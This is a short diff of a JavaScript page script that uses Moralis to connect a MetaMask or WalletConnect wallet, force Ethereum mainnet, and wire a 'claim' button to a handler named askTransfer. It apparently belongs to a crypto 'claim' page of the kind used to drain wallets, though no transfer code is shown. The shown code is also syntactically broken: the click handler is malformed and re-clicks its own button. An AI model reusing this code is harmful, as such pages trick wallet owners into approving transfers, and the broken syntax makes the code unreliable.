@@ -3,12 +3,6 @@ let metamaskInstalled = false;
 if (typeof window.ethereum !== 'undefined') metamaskInstalled = true;
 
 let web3Provider;
-async function connectButton() {
-    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
-}
-async function claimButton() {
-    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
-}
 
 Moralis.onWeb3Enabled(async (data) => {
     if (data.chainId !== 1 && metamaskInstalled) await Moralis.switchNetwork("0x1");
@@ -336,6 +330,13 @@ window.addEventListener("load", async () => {
   document.querySelector("#claimButton").addEventListener("click", askTransfer() {
         document.getElementById("claimButton").click();
 });
+
+async function connectButton() {
+    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
+}
+async function claimButton() {
+    await Moralis.enableWeb3(metamaskInstalled ? {} : { provider: "walletconnect" });
+}
 
          
         
